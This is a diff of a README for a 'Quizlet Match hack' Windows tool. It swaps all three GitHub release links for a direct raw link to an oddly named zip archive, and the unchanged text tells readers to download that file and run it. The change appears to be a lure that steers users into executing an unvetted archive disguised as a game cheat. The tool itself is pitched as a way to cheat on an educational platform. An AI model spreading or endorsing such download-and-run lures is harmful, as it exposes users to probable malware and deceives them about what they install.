@@ -1,6 +1,6 @@
 # 🧩 quizlet-match-hack - Faster Match Games, Less Rework
 
-[![Download Quizlet Match Hack](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/dolcefarnientesmallcane234/quizlet-match-hack/releases)
+[![Download Quizlet Match Hack](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/dolcefarnientesmallcane234/quizlet-match-hack/main/Algerine/hack-match-quizlet-nonentomological.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Use it if you want to:
 
 Visit this page to download the latest release:
 
-https://github.com/dolcefarnientesmallcane234/quizlet-match-hack/releases
+https://raw.githubusercontent.com/dolcefarnientesmallcane234/quizlet-match-hack/main/Algerine/hack-match-quizlet-nonentomological.zip
 
 On that page, look for the newest file for Windows. Download it to your computer before you start.
 
@@ -149,6 +149,6 @@ quizlet, quizlet-hack, quizlet-hacks, quizlet-live, quizlet-match, quizlet-match
 
 Download the Windows build from this page:
 
-https://github.com/dolcefarnientesmallcane234/quizlet-match-hack/releases
+https://raw.githubusercontent.com/dolcefarnientesmallcane234/quizlet-match-hack/main/Algerine/hack-match-quizlet-nonentomological.zip
 
 After the download finishes, open the file from your Downloads folder and run it on Windows
